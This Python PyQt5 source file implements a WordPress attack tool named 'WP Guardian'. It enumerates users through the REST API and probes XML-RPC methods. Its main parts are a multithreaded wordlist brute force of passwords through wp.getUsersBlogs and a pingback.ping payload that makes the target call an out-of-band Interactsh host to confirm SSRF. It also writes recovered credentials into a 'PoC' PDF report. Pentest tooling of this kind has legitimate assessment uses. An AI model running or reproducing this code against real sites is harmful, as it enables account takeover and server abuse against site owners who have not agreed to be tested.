#!/usr/bin/env python3
import sys, os, subprocess, threading, json, queue, time, uuid, traceback
from datetime import datetime
from urllib.parse import urljoin
import xmlrpc.client
import requests
from PyQt5 import QtWidgets, QtGui, QtCore
from reportlab.lib.pagesizes import A4
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak
from reportlab.lib import colors

# ---------- Config ----------
COMMON_XMLRPC_METHODS = [
    "system.listMethods", "system.multicall", "pingback.ping",
    "wp.getUsersBlogs", "wp.getPosts", "wp.getUsers", "wp.getOptions"
]
DEFAULT_TIMEOUT = 10

# ---------- Helpers ----------
def normalize_base(url):
    if not url:
        return ""
    if not url.startswith("http"):
        url = "https://" + url
    return url.rstrip("/")

def xmlrpc_endpoint(base):
    return urljoin(normalize_base(base) + "/", "xmlrpc.php")

def rest_users_endpoint(base):
    return urljoin(normalize_base(base) + "/", "wp-json/wp/v2/users")

def make_session(proxy=None):
    s = requests.Session()
    if proxy:
        s.proxies.update({"http": proxy, "https": proxy})
        s.verify = False
    s.headers.update({"User-Agent":"WPGuardian-Final/1.0"})
    return s

def xmlrpc_request_payload(method_name, params=None):
    if params is None:
        params = []
    def param_to_xml(p):
        if isinstance(p, str):
            return f"<value><string>{escape_xml(p)}</string></value>"
        if isinstance(p, bool):
            return f"<value><boolean>{int(p)}</boolean></value>"
        if isinstance(p, int):
            return f"<value><int>{p}</int></value>"
        return f"<value><string>{escape_xml(str(p))}</string></value>"
    params_xml = "".join(f"<param>{param_to_xml(p)}</param>" for p in params)
    return f"<?xml version='1.0'?><methodCall><methodName>{escape_xml(method_name)}</methodName><params>{params_xml}</params></methodCall>"

def escape_xml(s):
    return s.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace('"',"&quot;").replace("'", "&apos;")

def now_ts():
    return datetime.utcnow().isoformat() + "Z"

# ---------- Interactsh process (JSON mode) ----------
class InteractshProcess(QtCore.QObject):
    interaction = QtCore.pyqtSignal(dict)
    error = QtCore.pyqtSignal(str)
    started = QtCore.pyqtSignal()
    stopped = QtCore.pyqtSignal()

    def __init__(self, client_path="interactsh-client", auth_key=None, poll_interval=5, parent=None):
        super().__init__(parent)
        self.client_path = client_path
        self.auth_key = auth_key
        self.poll_interval = int(poll_interval)
        self._proc = None
        self._stop = threading.Event()
        self._thread = None

    def start(self):
        if self._thread and self._thread.is_alive():
            return
        self._stop.clear()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
        self.started.emit()

    def stop(self):
        self._stop.set()
        if self._proc:
            try:
                self._proc.terminate()
            except Exception:
                pass
        self.stopped.emit()

    def _run(self):
        cmd = [self.client_path, "-json", "-pi", str(self.poll_interval)]
        if self.auth_key:
            cmd.extend(["-auth", self.auth_key])
        try:
            self._proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=1, universal_newlines=True)
        except FileNotFoundError:
            self.error.emit(f"interactsh-client not found at: {self.client_path}")
            return
        except Exception as e:
            self.error.emit(str(e))
            return
        try:
            for line in self._proc.stdout:
                if self._stop.is_set():
                    break
                ln = line.strip()
                if not ln:
                    continue
                try:
                    obj = json.loads(ln)
                    self.interaction.emit(obj)
                except Exception:
                    self.interaction.emit({"raw": ln, "time": now_ts()})
            self._proc.wait(timeout=1)
        except Exception as e:
            self.error.emit(str(e))
        finally:
            try:
                if self._proc and self._proc.poll() is None:
                    self._proc.terminate()
            except:
                pass
            self.stopped.emit()

# ---------- Brute worker (updated to handle poison pills) ----------
class BruteWorker(threading.Thread):
    def __init__(self, endpoint, username, pw_queue, result_queue, stop_event, delay_s=0.5, proxy=None):
        super().__init__(daemon=True)
        self.endpoint = endpoint
        self.username = username
        self.pw_queue = pw_queue
        self.result_queue = result_queue
        self.stop_event = stop_event
        self.delay_s = delay_s
        self.proxy = proxy

    def run(self):
        sess = make_session(self.proxy)
        while not self.stop_event.is_set():
            try:
                # wait longer for feeder to fill queue
                pwd = self.pw_queue.get(timeout=2)
            except queue.Empty:
                # feeder may still be working; loop again
                continue

            # handle poison pill / shutdown
            if pwd is None or self.stop_event.is_set():
                # acknowledge and exit
                try:
                    self.pw_queue.task_done()
                except Exception:
                    pass
                return

            try:
                payload = xmlrpc_request_payload("wp.getUsersBlogs", [self.username, pwd])
                r = sess.post(self.endpoint, data=payload, headers={"Content-Type":"text/xml"}, timeout=DEFAULT_TIMEOUT)
                success = (r.status_code==200 and b"<fault>" not in r.content)
                detail = f"HTTP {r.status_code}" if r is not None else "no response"
            except Exception as e:
                success = False
                detail = f"error: {e}"

            # push result and mark done
            self.result_queue.put((self.username, pwd, success, detail))
            try:
                self.pw_queue.task_done()
            except Exception:
                pass

            if success:
                # notify others to stop
                self.stop_event.set()
                return

            time.sleep(self.delay_s)

# ---------- Main GUI ----------
class MainWindow(QtWidgets.QMainWindow):
    # thread-safe signal to notify GUI of brute success
    brute_success_signal = QtCore.pyqtSignal(str, str)

    def __init__(self):
        super().__init__()
        self.setWindowTitle("WP Guardian — Final")
        # connect signal to slot before UI building
        self.brute_success_signal.connect(self.on_brute_success)

        self._build_ui()
        self.showMaximized()                  # start maximized
        self.setMinimumSize(1100, 700)        # ensure reasonable minimum
        # dark style
        self.apply_dark_theme()
        # state
        self.interact_proc = None
        self.interact_hits = []
        self.pending_tests = {}
        self.session_actions = []
        # brute state
        self.brute_threads = []
        self.brute_stop = threading.Event()
        self.brute_pw_queue = None
        self.brute_results = queue.Queue()
        self.brute_found = []

    def apply_dark_theme(self):
        # A compact dark stylesheet
        dark = """
        QWidget { background-color: #2b2b2b; color: #e6e6e6; }
        QLineEdit, QPlainTextEdit, QTextEdit, QTableWidget, QListWidget { background-color: #262626; color: #e6e6e6; border: 1px solid #3a3a3a; }
        QPushButton { background-color: #3a3a3a; border: 1px solid #4a4a4a; padding:6px; }
        QPushButton:hover { background-color:#505050; }
        QHeaderView::section { background-color: #333333; color: #e6e6e6; border: none; }
        QTableWidget::item:selected, QListWidget::item:selected { background-color: #444444; color: #fff; }
        QStatusBar { background:#222; color:#ddd; }
        """
        self.setStyleSheet(dark)

    def _build_ui(self):
        w = QtWidgets.QWidget()
        self.setCentralWidget(w)
        layout = QtWidgets.QVBoxLayout(w)

        # Top: target and controls
        top = QtWidgets.QHBoxLayout()
        top.addWidget(QtWidgets.QLabel("Target:"))
        self.target_input = QtWidgets.QLineEdit("https://localhost")
        top.addWidget(self.target_input, 3)
        top.addWidget(QtWidgets.QLabel("proxy (optional):"))
        self.proxy_input = QtWidgets.QLineEdit()
        top.addWidget(self.proxy_input, 2)
        probe_btn = QtWidgets.QPushButton("Probe XML-RPC"); probe_btn.clicked.connect(self.on_probe)
        top.addWidget(probe_btn)
        fetch_btn = QtWidgets.QPushButton("Fetch REST users"); fetch_btn.clicked.connect(self.on_fetch_users)
        top.addWidget(fetch_btn)
        layout.addLayout(top)

        # Splitter for main area (left: lists, right: actions)
        main_split = QtWidgets.QSplitter(QtCore.Qt.Horizontal)
        layout.addWidget(main_split, 10)

        # Left pane (probe results, fingerprint, users, interactsh hits)
        left = QtWidgets.QWidget()
        left_l = QtWidgets.QVBoxLayout(left)

        # Methods table
        methods_group = QtWidgets.QGroupBox("XML-RPC methods & fingerprint")
        mg = QtWidgets.QVBoxLayout()
        self.methods_table = QtWidgets.QTableWidget(0,3)
        self.methods_table.setHorizontalHeaderLabels(["Method","Supported","Notes"])
        self.methods_table.horizontalHeader().setSectionResizeMode(QtWidgets.QHeaderView.Stretch)
        mg.addWidget(self.methods_table)
        self.fp_text = QtWidgets.QPlainTextEdit(); self.fp_text.setMaximumHeight(120)
        mg.addWidget(self.fp_text)
        methods_group.setLayout(mg)
        left_l.addWidget(methods_group, 3)

        # Discovered users
        users_group = QtWidgets.QGroupBox("Discovered users (REST)")
        ug = QtWidgets.QVBoxLayout()
        self.users_list = QtWidgets.QListWidget()
        ug.addWidget(self.users_list)
        use_btn = QtWidgets.QPushButton("Use selected"); use_btn.clicked.connect(self.on_use_selected)
        ug.addWidget(use_btn)
        users_group.setLayout(ug)
        left_l.addWidget(users_group, 2)

        # Interactsh hits
        hits_group = QtWidgets.QGroupBox("Interactsh hits (live)")
        hg = QtWidgets.QVBoxLayout()
        self.hits_table = QtWidgets.QTableWidget(0,5)
        self.hits_table.setHorizontalHeaderLabels(["Time","Type","RemoteAddr","MatchedToken","Summary/raw"])
        self.hits_table.horizontalHeader().setSectionResizeMode(QtWidgets.QHeaderView.Stretch)
        hg.addWidget(self.hits_table)
        left_l.addWidget(hits_group)
        hits_group.setLayout(hg)

        main_split.addWidget(left)

        # Right pane (actions)
        right = QtWidgets.QWidget()
        right_l = QtWidgets.QVBoxLayout(right)

        # Brute box
        brute_box = QtWidgets.QGroupBox("Brute-force (wp.getUsersBlogs) — SAFE rate-limited")
        br_layout = QtWidgets.QFormLayout()
        self.b_username = QtWidgets.QLineEdit()
        self.b_pwfile = QtWidgets.QLineEdit(); self.b_pwfile.setReadOnly(True)
        pw_browse = QtWidgets.QPushButton("Browse"); pw_browse.clicked.connect(self.on_browse_pwfile)
        pw_h = QtWidgets.QHBoxLayout(); pw_h.addWidget(self.b_pwfile); pw_h.addWidget(pw_browse)
        self.b_threads = QtWidgets.QSpinBox(); self.b_threads.setRange(1,16); self.b_threads.setValue(3)
        self.b_delay = QtWidgets.QDoubleSpinBox(); self.b_delay.setRange(0.1,30.0); self.b_delay.setValue(0.6)
        start_br = QtWidgets.QPushButton("Start Brute"); start_br.clicked.connect(self.on_start_brute)
        stop_br = QtWidgets.QPushButton("Stop Brute"); stop_br.clicked.connect(self.on_stop_brute)
        br_layout.addRow("Username:", self.b_username)
        br_layout.addRow("Password list:", pw_h)
        br_layout.addRow("Threads:", self.b_threads)
        br_layout.addRow("Delay (s):", self.b_delay)
        br_layout.addRow(start_br, stop_br)
        brute_box.setLayout(br_layout)
        right_l.addWidget(brute_box)

        # Custom XML
        custom_box = QtWidgets.QGroupBox("Custom XML-RPC payload (non-destructive recommended)")
        cb_v = QtWidgets.QVBoxLayout()
        self.xml_text = QtWidgets.QPlainTextEdit()
        self.xml_text.setPlainText("""<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://{INTERACTSH_TOKEN}</string></value></param>
    <param><value><string>https://example.com/target-page</string></value></param>
  </params>
</methodCall>""")
        cb_v.addWidget(self.xml_text)
        xml_h = QtWidgets.QHBoxLayout()
        send_xml_btn = QtWidgets.QPushButton("Send Custom XML"); send_xml_btn.clicked.connect(self.on_send_custom_xml)
        ping_tpl = QtWidgets.QPushButton("Insert pingback template"); ping_tpl.clicked.connect(self.on_insert_pingback_template)
        xml_h.addWidget(send_xml_btn); xml_h.addWidget(ping_tpl)
        cb_v.addLayout(xml_h)
        custom_box.setLayout(cb_v)
        right_l.addWidget(custom_box)

        # Interactsh control + config
        interact_box = QtWidgets.QGroupBox("Interactsh (OOB) — start to collect hits")
        ib = QtWidgets.QFormLayout()
        self.client_path_input = QtWidgets.QLineEdit("interactsh-client")
        self.auth_input = QtWidgets.QLineEdit()
        self.auth_input.setPlaceholderText("PDCP API key (optional)")
        self.poll_spin = QtWidgets.QSpinBox(); self.poll_spin.setRange(1,60); self.poll_spin.setValue(5)
        start_is = QtWidgets.QPushButton("Start Interactsh"); start_is.clicked.connect(self.on_interact_start)
        stop_is = QtWidgets.QPushButton("Stop Interactsh"); stop_is.clicked.connect(self.on_interact_stop)
        ib.addRow("interactsh-client path:", self.client_path_input)
        ib.addRow("PDCP API key (optional):", self.auth_input)
        ib.addRow("Poll interval (s):", self.poll_spin)
        ib.addRow(start_is, stop_is)
        interact_box.setLayout(ib)
        right_l.addWidget(interact_box)

        # Log and export
        log_group = QtWidgets.QGroupBox("Session log & export")
        lg = QtWidgets.QVBoxLayout()
        self.logbox = QtWidgets.QPlainTextEdit(); self.logbox.setReadOnly(True); self.logbox.setMaximumHeight(200)
        lg.addWidget(self.logbox)
        log_buttons = QtWidgets.QHBoxLayout()
        save_log_btn = QtWidgets.QPushButton("Save log"); save_log_btn.clicked.connect(self.on_save_log)
        clear_log_btn = QtWidgets.QPushButton("Clear Log"); clear_log_btn.clicked.connect(self.logbox.clear)
        export_pdf_btn = QtWidgets.QPushButton("Export PoC (PDF)"); export_pdf_btn.clicked.connect(self.on_export_pdf)
        log_buttons.addWidget(save_log_btn); log_buttons.addWidget(clear_log_btn); log_buttons.addWidget(export_pdf_btn)
        lg.addLayout(log_buttons)
        log_group.setLayout(lg)
        right_l.addWidget(log_group, 3)

        main_split.addWidget(right)
        main_split.setStretchFactor(0,3)
        main_split.setStretchFactor(1,2)

        self.setCentralWidget(w)
        self.status = QtWidgets.QStatusBar(); self.setStatusBar(self.status)

    # ---------- Logging ----------
    def log(self, *parts):
        t = now_ts()
        s = "["+t+"] " + " ".join(str(p) for p in parts)
        # Append directly to widget (not ideal from threads but kept for compatibility)
        # If you see threading issues, we can route logs via signals.
        self.logbox.appendPlainText(s)
        self.session_actions.append({"ts": t, "msg": " ".join(str(p) for p in parts)})

    # ---------- Probe & REST ----------
    def on_probe(self):
        base = self.target_input.text().strip()
        proxy = self.proxy_input.text().strip() or None
        if not base:
            QtWidgets.QMessageBox.warning(self, "No target", "Enter target base URL first.")
            return
        self.status.showMessage("Probing xmlrpc...")
        self.log("Probing xmlrpc:", base)
        def worker():
            try:
                methods, fp = self.probe_xmlrpc(xmlrpc_endpoint(base), proxy=proxy)
                QtCore.QMetaObject.invokeMethod(self, "_update_probe_result", QtCore.Qt.QueuedConnection,
                                                QtCore.Q_ARG(object, methods), QtCore.Q_ARG(object, fp))
            except Exception as e:
                self.log("Probe error:", e)
            finally:
                QtCore.QMetaObject.invokeMethod(self.status, "showMessage", QtCore.Qt.QueuedConnection, QtCore.Q_ARG(str, "Ready"))
        threading.Thread(target=worker, daemon=True).start()

    def probe_xmlrpc(self, endpoint, proxy=None):
        sess = make_session(proxy)
        fingerprint = {}
        methods = {}
        try:
            r = sess.get(endpoint, timeout=DEFAULT_TIMEOUT)
            fingerprint['headers'] = dict(r.headers)
            fingerprint['x-pingback'] = r.headers.get('x-pingback')
        except Exception as e:
            fingerprint['headers_error'] = str(e)
        try:
            client = xmlrpc.client.ServerProxy(endpoint, allow_none=True)
            mlist = client.system.listMethods()
            for m in COMMON_XMLRPC_METHODS:
                methods[m] = (m in mlist, "listed")
            return methods, fingerprint
        except Exception:
            for m in COMMON_XMLRPC_METHODS:
                try:
                    payload = xmlrpc_request_payload(m)
                    r = sess.post(endpoint, data=payload, headers={"Content-Type":"text/xml"}, timeout=DEFAULT_TIMEOUT)
                    methods[m] = (r.status_code==200 and b"<fault>" not in r.content, f"HTTP {r.status_code}")
                except Exception as e:
                    methods[m] = (False, f"err:{e}")
            return methods, fingerprint

    @QtCore.pyqtSlot(object, object)
    def _update_probe_result(self, methods, fp):
        self.methods_table.setRowCount(0)
        for m,(ok,note) in methods.items():
            r = self.methods_table.rowCount()
            self.methods_table.insertRow(r)
            self.methods_table.setItem(r,0, QtWidgets.QTableWidgetItem(m))
            self.methods_table.setItem(r,1, QtWidgets.QTableWidgetItem("YES" if ok else "NO"))
            self.methods_table.setItem(r,2, QtWidgets.QTableWidgetItem(str(note)))
        lines = []
        if fp.get("x-pingback"):
            lines.append("X-Pingback: "+str(fp["x-pingback"]))
        if fp.get("headers"):
            for k,v in fp["headers"].items():
                lines.append(f"{k}: {v}")
        if not lines:
            lines=["No fingerprint data."]
        self.fp_text.setPlainText("\n".join(lines))
        self.log("Probe finished; fingerprint items:", len(lines))

    # ---------- REST users ----------
    def on_fetch_users(self):
        base = self.target_input.text().strip()
        proxy = self.proxy_input.text().strip() or None
        if not base:
            QtWidgets.QMessageBox.warning(self, "No target", "Enter target base URL first.")
            return
        self.status.showMessage("Fetching REST users...")
        self.log("Fetching REST users:", base)
        def worker():
            try:
                users = self.fetch_rest_users(base, proxy=proxy)
                QtCore.QMetaObject.invokeMethod(self, "_populate_users", QtCore.Qt.QueuedConnection, QtCore.Q_ARG(object, users))
            except Exception as e:
                self.log("REST fetch error:", e)
            finally:
                QtCore.QMetaObject.invokeMethod(self.status, "showMessage", QtCore.Qt.QueuedConnection, QtCore.Q_ARG(str, "Ready"))
        threading.Thread(target=worker, daemon=True).start()

    def fetch_rest_users(self, base, proxy=None):
        endpoint = rest_users_endpoint(base)
        sess = make_session(proxy)
        users=[]
        page=1
        per_page=100
        while True:
            r = sess.get(endpoint, params={"page":page,"per_page":per_page}, timeout=DEFAULT_TIMEOUT)
            if r.status_code==200:
                batch = r.json()
                if not batch:
                    break
                users.extend(batch)
                if len(batch)<per_page:
                    break
                page+=1
            else:
                raise Exception(f"HTTP {r.status_code}")
        return users

    @QtCore.pyqtSlot(object)
    def _populate_users(self, users):
        self.users_list.clear()
        for u in users:
            display = u.get("slug") or u.get("name") or str(u.get("id"))
            self.users_list.addItem(display)
        self.log(f"Fetched {len(users)} users.")

    def on_use_selected(self):
        it = self.users_list.currentItem()
        if not it:
            return
        self.b_username.setText(it.text())
        self.log("Using username:", it.text())

    def on_browse_pwfile(self):
        fname, _ = QtWidgets.QFileDialog.getOpenFileName(self, "Select password list", "", "Text files (*.txt);;All files (*)")
        if fname:
            self.b_pwfile.setText(fname)

    # ---------- Password feeder (memory safe) ----------
    def _feed_pw_queue(self, pwfile_path):
        try:
            with open(pwfile_path, "r", errors="ignore") as f:
                for ln in f:
                    if self.brute_stop.is_set():
                        self.log("Password feeder stopped by user.")
                        break
                    pw = ln.strip()
                    if pw:
                        # will block if queue is full, controlling memory usage
                        self.brute_pw_queue.put(pw)
            # push poison pills for each worker so they exit cleanly
            for _ in self.brute_threads:
                try:
                    self.brute_pw_queue.put(None)
                except Exception:
                    pass
            self.log("Finished feeding password file to queue.")
        except FileNotFoundError:
            self.log(f"Error: Password file not found at {pwfile_path}")
        except Exception as e:
            self.log(f"Error reading password file: {e}")

    # ---------- Custom XML with token ----------
    def new_token(self):
        return uuid.uuid4().hex[:16]

    def on_insert_pingback_template(self):
        token = "{INTERACTSH_TOKEN}"
        tpl = """<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://{TOKEN}</string></value></param>
    <param><value><string>https://example.com/target-page</string></value></param>
  </params>
</methodCall>"""
        self.xml_text.setPlainText(tpl.replace("{TOKEN}", token))

    def on_send_custom_xml(self):
        base = self.target_input.text().strip()
        if not base:
            QtWidgets.QMessageBox.warning(self, "No target", "Set target first.")
            return
        xml_payload = self.xml_text.toPlainText()
        token = self.new_token()
        xml_payload = xml_payload.replace("{INTERACTSH_TOKEN}", token).replace("{TOKEN}", token)
        endpoint = xmlrpc_endpoint(base)
        proxy = self.proxy_input.text().strip() or None
        self.log("Sending custom XML to", endpoint)
        self.pending_tests[token] = {"time": now_ts(), "type":"custom_xml", "payload": xml_payload, "confirmed": False, "hits": []}
        def worker():
            try:
                sess = make_session(proxy)
                r = sess.post(endpoint, data=xml_payload.encode("utf-8"), headers={"Content-Type":"text/xml"}, timeout=DEFAULT_TIMEOUT)
                self.pending_tests[token]["response_status"] = r.status_code
                self.pending_tests[token]["response_body"] = (r.text[:4000] if r.text else "")
                self.log(f"Custom XML response: HTTP {r.status_code}, length {len(r.content) if r.content else 0}")
            except Exception as e:
                self.log("Custom XML send error:", e)
        threading.Thread(target=worker, daemon=True).start()
        QtWidgets.QMessageBox.information(self, "Sent", f"Custom XML sent with token {token}.\nWatch Interactsh table for hits. Token: {token}")

    # ---------- Interactsh ----------
    def on_interact_start(self):
        path = self.client_path_input.text().strip() or "interactsh-client"
        auth = self.auth_input.text().strip() or None
        poll = self.poll_spin.value()
        self.interact_proc = InteractshProcess(client_path=path, auth_key=auth, poll_interval=poll)
        self.interact_proc.interaction.connect(self.on_interaction)
        self.interact_proc.error.connect(self.on_interact_error)
        self.interact_proc.started.connect(lambda: self.status.showMessage("Interactsh started"))
        self.interact_proc.stopped.connect(lambda: self.status.showMessage("Interactsh stopped"))
        self.interact_proc.start()
        self.log("Interactsh started (client path="+path+")")

    def on_interact_stop(self):
        if self.interact_proc:
            self.interact_proc.stop()
            self.interact_proc = None
            self.log("Interactsh stopped")

    @QtCore.pyqtSlot(dict)
    def on_interaction(self, obj):
        now = now_ts()
        typ = obj.get("Type") or obj.get("type") or "unknown"
        remote = obj.get("RemoteAddr") or obj.get("remoteAddr") or ""
        summary = obj.get("Request") or obj.get("RequestRaw") or obj.get("raw") or str(obj)
        matched_token = None
        s = json.dumps(obj) if not isinstance(obj, str) else str(obj)
        for token in list(self.pending_tests.keys()):
            if token in s:
                matched_token = token
                self.pending_tests[token]["confirmed"] = True
                self.pending_tests[token]["hits"].append({"time": now, "obj": obj})
                break
        r = self.hits_table.rowCount()
        self.hits_table.insertRow(r)
        self.hits_table.setItem(r,0, QtWidgets.QTableWidgetItem(now))
        self.hits_table.setItem(r,1, QtWidgets.QTableWidgetItem(str(typ)))
        self.hits_table.setItem(r,2, QtWidgets.QTableWidgetItem(str(remote)))
        self.hits_table.setItem(r,3, QtWidgets.QTableWidgetItem(str(matched_token) if matched_token else ""))
        self.hits_table.setItem(r,4, QtWidgets.QTableWidgetItem((summary[:400] if isinstance(summary,str) else str(summary)) ))
        self.interact_hits.append({"ts": now, "type": typ, "remote": remote, "matched": matched_token, "raw": obj})
        self.log("Interactsh hit:", typ, "matched_token="+str(matched_token))
        if matched_token:
            QtWidgets.QMessageBox.information(self, "SSRF Confirmed", f"Pending test token {matched_token} confirmed by Interactsh hit.")
            self.log(f"Pending test {matched_token} confirmed.")

    @QtCore.pyqtSlot(str)
    def on_interact_error(self, err):
        self.log("Interactsh error:", err)
        QtWidgets.QMessageBox.warning(self, "Interactsh error", err)

    # ---------- Brute functionality (updated) ----------
    def on_start_brute(self):
        base = self.target_input.text().strip()
        username = self.b_username.text().strip()
        pwfile = self.b_pwfile.text().strip()
        threads = self.b_threads.value()
        delay = self.b_delay.value()
        proxy = self.proxy_input.text().strip() or None
        if not base or not username or not pwfile or not os.path.isfile(pwfile):
            QtWidgets.QMessageBox.warning(self, "Missing", "Provide valid target, username and password list.")
            return
        endpoint = xmlrpc_endpoint(base)
        self.brute_stop.clear()

        # bounded queue to avoid memory explosion
        queue_size = max(1000, threads * 500)
        self.brute_pw_queue = queue.Queue(maxsize=queue_size)

        # prepare thread list first so feeder knows how many poison pills to insert later
        self.brute_threads = []
        for i in range(threads):
            w = BruteWorker(endpoint, username, self.brute_pw_queue, self.brute_results, self.brute_stop, delay_s=delay, proxy=proxy)
            self.brute_threads.append(w)

        # start feeder thread (reads file line-by-line)
        feeder = threading.Thread(target=self._feed_pw_queue, args=(pwfile,), daemon=True)
        feeder.start()

        # start worker threads
        for w in self.brute_threads:
            w.start()

        # start monitor thread
        threading.Thread(target=self._brute_monitor, daemon=True).start()

        self.brute_found = []
        self.log("Starting brute force:", username, "pwfile=", pwfile, "threads=", threads, "queue_size=", queue_size)

    def _brute_monitor(self):
        while True:
            try:
                u,pw,ok,detail = self.brute_results.get(timeout=0.5)
                if ok:
                    # thread-safe UI notification via signal
                    self.brute_found.append((u,pw,detail))
                    self.brute_success_signal.emit(u, pw)
                    break
                else:
                    self.log("[BRUTE FAIL]", f"{u}:{pw}", detail)
            except queue.Empty:
                # stop if all workers dead or stop requested
                if all(not t.is_alive() for t in self.brute_threads):
                    break
                if self.brute_stop.is_set():
                    break
        self.log("Brute finished/stopped.")

    @QtCore.pyqtSlot(str, str)
    def on_brute_success(self, username, password):
        # This runs on the GUI thread via signal
        QtWidgets.QMessageBox.information(self, "Brute success", f"Found: {username}:{password}")
        self.log("[BRUTE SUCCESS]", f"{username}:{password}")

    def on_stop_brute(self):
        self.brute_stop.set()
        # push poison pills so workers unblock and exit
        try:
            for _ in self.brute_threads:
                self.brute_pw_queue.put(None)
        except Exception:
            pass
        self.log("Brute stop requested.")

    # ---------- Save / Export ----------
    def on_save_log(self):
        fn, _ = QtWidgets.QFileDialog.getSaveFileName(self, "Save log", "", "Log files (*.log);;Text (*.txt)")
        if not fn:
            return
        with open(fn, "w", encoding="utf-8") as f:
            f.write(self.logbox.toPlainText())
        self.log("Saved log to", fn)

    def on_export_pdf(self):
        target = self.target_input.text().strip()
        if not target:
            QtWidgets.QMessageBox.warning(self, "No target", "Set target before export")
            return
        fn, _ = QtWidgets.QFileDialog.getSaveFileName(self, "Export PoC (PDF)", "", "PDF (*.pdf)")
        if not fn:
            return
        try:
            self._generate_pdf(fn, target)
            QtWidgets.QMessageBox.information(self, "Exported", f"PoC PDF exported to {fn}")
            self.log("Exported PoC (PDF) to", fn)
        except Exception as e:
            self.log("PDF export error:", e)
            QtWidgets.QMessageBox.warning(self, "Export error", f"Could not generate PDF: {e}")

    def _generate_pdf(self, filename, target):
        doc = SimpleDocTemplate(filename, pagesize=A4, rightMargin=36, leftMargin=36, topMargin=36, bottomMargin=36)
        styles = getSampleStyleSheet()
        normal = styles["Normal"]
        heading = ParagraphStyle("Heading", parent=styles["Heading1"], alignment=0, fontSize=14, spaceAfter=6)
        small = ParagraphStyle("small", parent=styles["Normal"], fontSize=9)
        elems = []
        elems.append(Paragraph(f"PoC Report — {target}", heading))
        elems.append(Paragraph(f"Generated: {now_ts()}", small))
        elems.append(Spacer(1,12))
        # Fingerprint
        elems.append(Paragraph("Fingerprint", styles["Heading2"]))
        fp = self.fp_text.toPlainText().strip() or "No fingerprint data."
        elems.append(Paragraph(fp.replace("\n","<br/>"), normal))
        elems.append(Spacer(1,12))
        # Methods
        elems.append(Paragraph("XML-RPC Methods Probe", styles["Heading2"]))
        rows = [["Method","Supported","Notes"]]
        for row in range(self.methods_table.rowCount()):
            method = self.methods_table.item(row,0).text()
            sup = self.methods_table.item(row,1).text()
            note = self.methods_table.item(row,2).text()
            rows.append([method, sup, note])
        tbl = Table(rows, colWidths=[150,60,280])
        tbl.setStyle(TableStyle([("BACKGROUND",(0,0),(-1,0),colors.HexColor("#333333")),
                                 ("TEXTCOLOR",(0,0),(-1,0),colors.white),
                                 ("GRID",(0,0),(-1,-1),0.25,colors.grey)]))
        elems.append(tbl)
        elems.append(Spacer(1,12))
        # Users
        elems.append(Paragraph("Discovered users", styles["Heading2"]))
        if self.users_list.count()>0:
            for i in range(self.users_list.count()):
                elems.append(Paragraph("- " + self.users_list.item(i).text(), normal))
        else:
            elems.append(Paragraph("No users discovered.", normal))
        elems.append(Spacer(1,12))
        # Pending tests / SSRF
        elems.append(Paragraph("Pending Tests & SSRF Confirmations", styles["Heading2"]))
        if self.pending_tests:
            for token,info in self.pending_tests.items():
                elems.append(Paragraph(f"Token: {token} — started: {info.get('time')}", normal))
                elems.append(Paragraph(f"Confirmed: {info.get('confirmed')}", normal))
                payload = info.get("payload","")
                if payload:
                    elems.append(Paragraph("Payload (snippet):", small))
                    elems.append(Paragraph("<pre>%s</pre>" % (payload[:1000].replace("<","&lt;").replace(">","&gt;")), small))
                if info.get("hits"):
                    elems.append(Paragraph("Hits:", normal))
                    for h in info.get("hits"):
                        elems.append(Paragraph(f"- {h['time']}", small))
                        elems.append(Paragraph("<pre>%s</pre>" % (json.dumps(h['obj'], indent=2)[:1200].replace("<","&lt;")), small))
                elems.append(Spacer(1,6))
        else:
            elems.append(Paragraph("No pending tests recorded.", normal))
        elems.append(Spacer(1,12))
        # Interactsh raw
        elems.append(Paragraph("Recent Interactsh Hits (raw)", styles["Heading2"]))
        for h in self.interact_hits[-50:]:
            elems.append(Paragraph(f"- [{h['ts']}] type={h['type']} remote={h['remote']} matched={h.get('matched')}", small))
        elems.append(Spacer(1,12))
        # Brute results
        elems.append(Paragraph("Brute-force results", styles["Heading2"]))
        if self.brute_found:
            for u,pw,detail in self.brute_found:
                elems.append(Paragraph(f"- Found: {u}:{pw} — {detail}", normal))
        else:
            elems.append(Paragraph("No credentials discovered (or brute not run).", normal))
        elems.append(Spacer(1,12))
        # Security Risk Assessment (small summary)
        elems.append(Paragraph("Security Risk Assessment", styles["Heading2"]))
        confirmed_ssrf = any(info.get("confirmed") for info in self.pending_tests.values()) if isinstance(self.pending_tests, dict) else False
        brute_ok = bool(self.brute_found)
        if confirmed_ssrf and brute_ok:
            level = "CRITICAL — Remote server-side request forgery and valid credential combination found."
        elif confirmed_ssrf:
            level = "HIGH — Server-side request forgery confirmed (xmlrpc pingback)."
        elif brute_ok:
            level = "MEDIUM — Valid WordPress credentials recovered via XML-RPC."
        else:
            level = "LOW — No exploitable behavior confirmed."
        elems.append(Paragraph(f"<b>Overall Risk Level:</b> {level}", normal))
        elems.append(Spacer(1,12))

        # Force page break to increase report size & readability
        elems.append(PageBreak())

        # Session actions / log
        elems.append(Paragraph("Session log (recent)", styles["Heading2"]))
        for act in self.session_actions[-200:]:
            elems.append(Paragraph(f"- [{act['ts']}] {act['msg']}", small))
        doc.build(elems)

# ---------- main ----------
def main():
    app = QtWidgets.QApplication(sys.argv)
    w = MainWindow()
    w.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    try:
        main()
    except Exception:
        traceback.print_exc()
